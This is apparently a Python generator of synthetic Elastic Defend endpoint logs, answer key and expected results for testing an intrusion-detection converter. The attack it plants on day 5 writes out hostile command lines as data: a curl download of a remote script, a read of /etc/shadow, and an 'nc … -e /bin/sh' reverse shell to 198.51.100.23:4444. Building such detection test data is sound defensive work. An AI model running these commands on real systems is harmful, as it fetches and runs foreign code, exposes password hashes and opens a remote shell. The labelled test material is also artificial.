"""Generate synthetic Elastic Defend (ECS) events for the ORTSOC_DEV converter tests.

5 days (2026-11-02 .. 2026-11-06, US/Pacific) for 2 hosts:
  days 1-3 train, day 4 validation, day 5 test.
Benign activity: SSH user shells, hourly cron backup jobs, file reads/writes,
DNS and HTTP(S) connections. All activity is between 07:00 and 20:00 Pacific so
day boundaries agree whether PIDSMaker reads them in US/Pacific or US/Eastern.

One planted attack on day 5 on host ws01 (14:05-14:20 Pacific):
  sshd -> bash (root) -> curl downloads http://203.0.113.66:8080/x.sh to /tmp/x.sh
                      -> chmod +x /tmp/x.sh
                      -> /tmp/x.sh -> reads /etc/shadow, writes /tmp/.cache/payload
                                   -> nc connects to 198.51.100.23:4444

Edge cases: events missing process.entity_id (pid fallback), missing parent,
missing file.path, missing destination.ip, missing both entity_id and pid,
nanosecond and millisecond timestamps, +00:00 offsets, an unparseable
timestamp, search-hit wrapped documents (one file), hits without event.id,
documents with neither event.id nor _id, a flat dotted-key document, the same
file path on both hosts, and dropped actions (process end, file deletion, DNS
lookups, chmod attribute change).

Usage:
    python make_synthetic_ecs.py --out <dir>
writes <dir>/ecs/*.ndjson, <dir>/answer_key.csv and <dir>/expected.json.
"""

import argparse
import json
import os
import random
from collections import Counter
from datetime import datetime, timedelta, timezone

DAYS = ["2026-11-02", "2026-11-03", "2026-11-04", "2026-11-05", "2026-11-06"]
PST = timezone(timedelta(hours=-8))  # US/Pacific standard time (DST ended 2026-11-01)
HOSTS = {
    "ws01": {"id": "8c1e2f3a-ws01", "name": "ortsoc-ws01", "ip": "10.20.0.11"},
    "ws02": {"id": "4b7d9e10-ws02", "name": "ortsoc-ws02", "ip": "10.20.0.12"},
}
ATTACK_HOST = "ws01"
ATTACK_START = datetime(2026, 11, 6, 14, 5, 0, tzinfo=PST)
ATTACK_END = datetime(2026, 11, 6, 14, 20, 0, tzinfo=PST)


class Gen:
    def __init__(self, seed=7):
        self.rng = random.Random(seed)
        self.docs = {}  # file name -> list of (doc, wrap_as_hit)
        self.pid = Counter()
        self.eid = 0
        self.evid = 0
        self.expected = Counter()  # edge-case counters the converter must report
        self.malicious = {"subject": set(), "file": set(), "netflow": set()}
        self.attack_root = None

    # -- primitives --------------------------------------------------------
    def ts(self, dt, style="ns"):
        u = dt.astimezone(timezone.utc)
        base = u.strftime("%Y-%m-%dT%H:%M:%S")
        if style == "ns":
            return f"{base}.{u.microsecond:06d}{self.rng.randint(0, 999):03d}Z"
        if style == "ms":
            return f"{base}.{u.microsecond // 1000:03d}Z"
        if style == "offset":
            return f"{base}.{u.microsecond:06d}+00:00"
        raise ValueError(style)

    def new_eid(self, host):
        self.eid += 1
        return f"EID-{host}-{self.eid:06d}"

    def new_pid(self, host):
        self.pid[host] += 1
        return 1000 + self.pid[host]

    def host_fields(self, host):
        h = HOSTS[host]
        return {"id": h["id"], "hostname": h["name"], "name": h["name"], "os": {"type": "linux"}}

    def emit(self, fname, doc, wrap=False, event_id=True):
        if event_id:
            self.evid += 1
            doc.setdefault("event", {})["id"] = f"evt-{self.evid:08d}"
        self.docs.setdefault(fname, []).append((doc, wrap))

    def proc_obj(self, p):
        o = {"pid": p["pid"], "name": p["name"], "executable": p["exe"],
             "command_line": p["cmd"], "start": p["start"]}
        if p.get("eid"):
            o["entity_id"] = p["eid"]
        return o

    def process(self, host, name, exe, cmd, start_dt, eid=True):
        return {"host": host, "pid": self.new_pid(host), "name": name, "exe": exe, "cmd": cmd,
                "start": self.ts(start_dt, "ms"), "eid": self.new_eid(host) if eid else None}

    def start_event(self, fname, p, parent, dt, action="exec", wrap=False):
        proc = self.proc_obj(p)
        if parent is not None:
            proc["parent"] = self.proc_obj(parent)
        doc = {"@timestamp": self.ts(dt), "agent": {"type": "endpoint"},
               "host": self.host_fields(p["host"]),
               "event": {"category": ["process"], "type": ["start"], "action": action,
                         "dataset": "endpoint.events.process"},
               "process": proc}
        self.emit(fname, doc, wrap)

    def end_event(self, fname, p, dt):
        doc = {"@timestamp": self.ts(dt), "host": self.host_fields(p["host"]),
               "event": {"category": ["process"], "type": ["end"], "action": "end"},
               "process": self.proc_obj(p)}
        self.emit(fname, doc)

    def file_event(self, fname, p, dt, action, path, wrap=False, style="ns"):
        etype = {"creation": ["creation"], "modification": ["change"], "deletion": ["deletion"],
                 "open": ["access"], "read": ["access"], "attributes_modified": ["change"]}[action]
        doc = {"@timestamp": self.ts(dt, style), "host": self.host_fields(p["host"]),
               "event": {"category": ["file"], "type": etype, "action": action,
                         "dataset": "endpoint.events.file"},
               "process": self.proc_obj(p)}
        if path is not None:
            doc["file"] = {"path": path, "name": os.path.basename(path)}
        self.emit(fname, doc, wrap)

    def net_event(self, fname, p, dt, dst_ip, dst_port, transport="tcp",
                  action="connection_attempted", wrap=False):
        h = HOSTS[p["host"]]
        doc = {"@timestamp": self.ts(dt), "host": self.host_fields(p["host"]),
               "event": {"category": ["network"], "type": ["start", "connection"], "action": action,
                         "dataset": "endpoint.events.network"},
               "network": {"transport": transport, "direction": "egress"},
               "source": {"ip": h["ip"], "port": self.rng.randint(32768, 60999)},
               "process": self.proc_obj(p)}
        if dst_ip is not None:
            doc["destination"] = {"ip": dst_ip, "port": dst_port}
        self.emit(fname, doc, wrap)

    def dns_event(self, fname, p, dt, qname):
        doc = {"@timestamp": self.ts(dt), "host": self.host_fields(p["host"]),
               "event": {"category": ["network"], "type": ["protocol", "info"],
                         "action": "lookup_requested"},
               "dns": {"question": {"name": qname, "type": "A"}},
               "process": self.proc_obj(p)}
        self.emit(fname, doc)

    # -- scenario ------------------------------------------------------------
    def build(self):
        for d_idx, day in enumerate(DAYS):
            y, m, d = map(int, day.split("-"))
            for host in HOSTS:
                fname = f"{day}_{host}.ndjson"
                wrap = (day == DAYS[1] and host == "ws02")  # one file of search hits
                base = datetime(y, m, d, 7, 0, 0, tzinfo=PST)
                systemd = self.process(host, "systemd", "/usr/lib/systemd/systemd", "/sbin/init", base - timedelta(days=30))
                sshd = self.process(host, "sshd", "/usr/sbin/sshd", "/usr/sbin/sshd -D", base - timedelta(days=30))
                cron = self.process(host, "cron", "/usr/sbin/cron", "/usr/sbin/cron -f", base - timedelta(days=30))
                resolved = self.process(host, "systemd-resolved", "/usr/lib/systemd/systemd-resolved",
                                        "/usr/lib/systemd/systemd-resolved", base - timedelta(days=30))
                # Keep long-lived process identities stable across days.
                for p in (systemd, sshd, cron, resolved):
                    p["eid"] = f"EID-{host}-{p['name']}"
                    p["pid"] = {"systemd": 1, "sshd": 812, "cron": 640, "systemd-resolved": 590}[p["name"]]
                    p["start"] = "2026-10-03T08:00:00.000Z"

                for hour in range(7, 20):
                    t = datetime(y, m, d, hour, 0, 0, tzinfo=PST)
                    self.cron_job(fname, host, cron, t + timedelta(seconds=self.rng.randint(1, 50)), wrap)
                    self.user_session(fname, host, sshd, resolved,
                                      t + timedelta(minutes=self.rng.randint(15, 50)), wrap)

                # Same file path on both hosts every day.
                self.file_event(fname, systemd, base + timedelta(minutes=1), "read", "/etc/hosts", wrap)

                if d_idx == 1 and host == "ws01":
                    self.edge_cases(fname, host, sshd, cron, base + timedelta(hours=3))
                if d_idx == 4 and host == ATTACK_HOST:
                    self.attack(fname, host, sshd, resolved)
                    # Benign activity on the attack host inside the attack window.
                    self.cron_job(fname, host, cron, datetime(y, m, d, 14, 10, 30, tzinfo=PST), False)
                    self.user_session(fname, host, sshd, resolved, datetime(y, m, d, 14, 12, 0, tzinfo=PST), False)

    def cron_job(self, fname, host, cron, t, wrap, eid=True):
        sh = self.process(host, "sh", "/usr/bin/sh", "/bin/sh -c /usr/local/bin/backup.sh", t, eid=eid)
        self.start_event(fname, sh, cron, t, wrap=wrap)
        tar = self.process(host, "tar", "/usr/bin/tar", "tar czf /var/backups/home.tgz /home/student/docs",
                           t + timedelta(seconds=1), eid=eid)
        self.start_event(fname, tar, sh, t + timedelta(seconds=1), wrap=wrap)
        for i in range(3):
            self.file_event(fname, tar, t + timedelta(seconds=2 + i), "read", f"/home/student/docs/report{i}.txt", wrap)
        self.file_event(fname, tar, t + timedelta(seconds=6), "modification", "/var/backups/home.tgz", wrap)
        self.file_event(fname, sh, t + timedelta(seconds=7), "modification", "/var/log/backup.log", wrap)
        self.end_event(fname, tar, t + timedelta(seconds=8))
        self.end_event(fname, sh, t + timedelta(seconds=9))

    def user_session(self, fname, host, sshd, resolved, t, wrap):
        bash = self.process(host, "bash", "/usr/bin/bash", "-bash", t)
        self.start_event(fname, bash, sshd, t, wrap=wrap)
        self.file_event(fname, bash, t + timedelta(seconds=1), "read", "/home/student/.bashrc", wrap)
        vim = self.process(host, "vim", "/usr/bin/vim", "vim notes.txt", t + timedelta(seconds=5))
        self.start_event(fname, vim, bash, t + timedelta(seconds=5), wrap=wrap)
        self.file_event(fname, vim, t + timedelta(seconds=6), "open", "/home/student/notes.txt", wrap)
        self.file_event(fname, vim, t + timedelta(seconds=40), "modification", "/home/student/notes.txt", wrap)
        py = self.process(host, "python3", "/usr/bin/python3.12", "python3 fetch_weather.py", t + timedelta(seconds=60))
        self.start_event(fname, py, bash, t + timedelta(seconds=60), wrap=wrap)
        self.dns_event(fname, py, t + timedelta(seconds=61), "api.weather.gov")
        self.net_event(fname, resolved, t + timedelta(seconds=61), "1.1.1.1", 53, "udp", wrap=wrap)
        self.net_event(fname, py, t + timedelta(seconds=62), "23.45.67.89", 443, wrap=wrap)
        self.file_event(fname, py, t + timedelta(seconds=63), "creation", "/home/student/weather.json", wrap)
        wget = self.process(host, "wget", "/usr/bin/wget", "wget -q https://packages.osuosl.org/index.html",
                            t + timedelta(seconds=90))
        self.start_event(fname, wget, bash, t + timedelta(seconds=90), wrap=wrap)
        self.net_event(fname, wget, t + timedelta(seconds=91), "140.211.166.134", 443, wrap=wrap)
        self.file_event(fname, wget, t + timedelta(seconds=92), "creation", "/home/student/index.html", wrap)
        self.file_event(fname, bash, t + timedelta(seconds=120), "deletion", "/home/student/index.html", wrap)
        for p, s in ((vim, 41), (py, 64), (wget, 93), (bash, 200)):
            self.end_event(fname, p, t + timedelta(seconds=s))

    def edge_cases(self, fname, host, sshd, cron, t):
        e = self.expected
        # 1) Process with no entity_id: identity falls back to host|exe|pid|start.
        #    3 events (start + 2 file writes) use the fallback.
        self.cron_job(fname, host, cron, t, False, eid=False)
        e["fallback_cron_job_events"] += 1
        # 2) Process start with no parent at all -> CLONE edge skipped.
        orphan = self.process(host, "logger", "/usr/bin/logger", "logger hello", t + timedelta(minutes=1))
        self.start_event(fname, orphan, None, t + timedelta(minutes=1))
        e["parent_edge_skipped_missing_parent"] += 1
        # 3) File event without file.path -> skipped.
        self.file_event(fname, orphan, t + timedelta(minutes=1, seconds=1), "modification", None)
        e["no_file_path"] += 1
        # 4) Network event without destination.ip -> skipped.
        self.net_event(fname, orphan, t + timedelta(minutes=1, seconds=2), None, None)
        e["no_destination_ip"] += 1
        # 5) No entity_id and no pid -> skipped.
        ghost = {"host": host, "pid": None, "name": "ghost", "exe": "/usr/bin/ghost", "cmd": "ghost",
                 "start": None, "eid": None}
        doc = {"@timestamp": self.ts(t + timedelta(minutes=2)), "host": self.host_fields(host),
               "event": {"category": ["file"], "type": ["change"], "action": "modification"},
               "process": {"name": "ghost", "executable": "/usr/bin/ghost"},
               "file": {"path": "/tmp/ghost"}}
        self.emit(fname, doc)
        e["no_process_identity"] += 1
        # 6) Unparseable timestamp -> skipped.
        doc = {"@timestamp": "not-a-date", "host": self.host_fields(host),
               "event": {"category": ["file"], "type": ["change"], "action": "modification"},
               "process": self.proc_obj(orphan), "file": {"path": "/tmp/bad-ts"}}
        self.emit(fname, doc)
        e["bad_timestamp"] += 1
        # 7) Neither event.id nor _id -> synthetic event uuid (kept).
        self.file_event(fname, orphan, t + timedelta(minutes=3), "modification", "/var/log/no-id.log")
        self.docs[fname][-1][0]["event"].pop("id")
        e["synthetic_event_uuid"] += 1
        # 8) Flat dotted-key document (also millisecond precision timestamp).
        doc = {"@timestamp": self.ts(t + timedelta(minutes=4), "ms"),
               "host.id": HOSTS[host]["id"], "host.name": HOSTS[host]["name"],
               "event.category": "file", "event.action": "modification", "event.type": "change",
               "process.entity_id": orphan["eid"], "process.pid": orphan["pid"],
               "process.executable": orphan["exe"], "file.path": "/var/log/dotted.log"}
        self.emit(fname, doc)
        doc["event.id"] = doc.pop("event")["id"]
        # 9) +00:00 offset timestamp.
        self.file_event(fname, orphan, t + timedelta(minutes=5), "modification", "/var/log/offset.log", style="offset")
        # 10) Malformed JSON line.
        self.docs[fname].append(("{not json", False))
        e["malformed_json"] += 1
        # 11) Unmapped category (authentication).
        doc = {"@timestamp": self.ts(t + timedelta(minutes=6)), "host": self.host_fields(host),
               "event": {"category": ["authentication"], "action": "log_on", "outcome": "success"},
               "process": self.proc_obj(sshd)}
        self.emit(fname, doc)
        e["unmapped_category"] += 1

    def attack(self, fname, host, sshd, resolved):
        t = ATTACK_START
        mal = self.malicious
        h = HOSTS[host]["id"]

        bash = self.process(host, "bash", "/usr/bin/bash", "bash -i", t + timedelta(seconds=3))
        self.attack_root = bash["eid"]
        self.start_event(fname, bash, sshd, t + timedelta(seconds=3))
        mal["subject"].add(bash["eid"])
        mal["file"].add(f"{h}|/usr/bin/bash")  # image executed by the root inside the window

        curl = self.process(host, "curl", "/usr/bin/curl",
                            "curl -s http://203.0.113.66:8080/x.sh -o /tmp/x.sh", t + timedelta(seconds=30))
        self.start_event(fname, curl, bash, t + timedelta(seconds=30))
        self.net_event(fname, curl, t + timedelta(seconds=31), "203.0.113.66", 8080)
        self.file_event(fname, curl, t + timedelta(seconds=32), "creation", "/tmp/x.sh")
        self.end_event(fname, curl, t + timedelta(seconds=33))
        mal["subject"].add(curl["eid"])
        mal["file"] |= {f"{h}|/usr/bin/curl", f"{h}|/tmp/x.sh"}
        mal["netflow"].add(f"{h}|tcp|203.0.113.66:8080")

        chmod = self.process(host, "chmod", "/usr/bin/chmod", "chmod +x /tmp/x.sh", t + timedelta(seconds=40))
        self.start_event(fname, chmod, bash, t + timedelta(seconds=40))
        self.file_event(fname, chmod, t + timedelta(seconds=40, microseconds=500), "attributes_modified", "/tmp/x.sh")
        self.end_event(fname, chmod, t + timedelta(seconds=41))
        mal["subject"].add(chmod["eid"])
        mal["file"].add(f"{h}|/usr/bin/chmod")

        xsh = self.process(host, "x.sh", "/tmp/x.sh", "/tmp/x.sh", t + timedelta(seconds=60))
        self.start_event(fname, xsh, bash, t + timedelta(seconds=60))
        self.file_event(fname, xsh, t + timedelta(seconds=61), "read", "/etc/shadow")
        self.file_event(fname, xsh, t + timedelta(seconds=62), "creation", "/tmp/.cache/payload")
        mal["subject"].add(xsh["eid"])
        mal["file"] |= {f"{h}|/etc/shadow", f"{h}|/tmp/.cache/payload"}

        nc = self.process(host, "nc", "/usr/bin/nc", "nc 198.51.100.23 4444 -e /bin/sh", t + timedelta(seconds=90))
        self.start_event(fname, nc, xsh, t + timedelta(seconds=90))
        self.net_event(fname, nc, t + timedelta(seconds=91), "198.51.100.23", 4444)
        mal["subject"].add(nc["eid"])
        mal["file"].add(f"{h}|/usr/bin/nc")
        mal["netflow"].add(f"{h}|tcp|198.51.100.23:4444")

    # -- output --------------------------------------------------------------
    def write(self, out_dir):
        ecs_dir = os.path.join(out_dir, "ecs")
        os.makedirs(ecs_dir, exist_ok=True)
        hit_counter = 0
        hits_without_event_id = 0
        n_docs = 0
        for fname, items in sorted(self.docs.items()):
            with open(os.path.join(ecs_dir, fname), "w") as f:
                for doc, wrap in items:
                    n_docs += 1
                    if isinstance(doc, str):  # malformed line
                        f.write(doc + "\n")
                        continue
                    if wrap:
                        hit_counter += 1
                        # Every 5th hit drops event.id so the converter must use _id.
                        if hit_counter % 5 == 0:
                            doc["event"].pop("id", None)
                            hits_without_event_id += 1
                        doc = {"_index": ".ds-logs-endpoint.events-default-2026.11.03-000001",
                               "_id": f"hit-{hit_counter:06d}", "_source": doc}
                    f.write(json.dumps(doc) + "\n")
        with open(os.path.join(out_dir, "answer_key.csv"), "w") as f:
            f.write("attack_name,host,start,end,root_process_entity_id\n")
            f.write(f"curl_dropper,{HOSTS[ATTACK_HOST]['name']},{ATTACK_START.isoformat()},"
                    f"{ATTACK_END.isoformat()},{self.attack_root}\n")
        expected = {
            "documents": n_docs,
            "search_hits": hit_counter,
            "hits_without_event_id": hits_without_event_id,
            "edge_cases": dict(self.expected),
            "malicious": {k: sorted(v) for k, v in self.malicious.items()},
            "attack_root": self.attack_root,
            "hosts": HOSTS,
        }
        with open(os.path.join(out_dir, "expected.json"), "w") as f:
            json.dump(expected, f, indent=2, sort_keys=True)
        return expected


def generate(out_dir, seed=7):
    g = Gen(seed)
    g.build()
    return g.write(out_dir)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--seed", type=int, default=7)
    a = ap.parse_args()
    exp = generate(a.out, a.seed)
    print(json.dumps({k: exp[k] for k in ("documents", "search_hits", "edge_cases")}, indent=2))
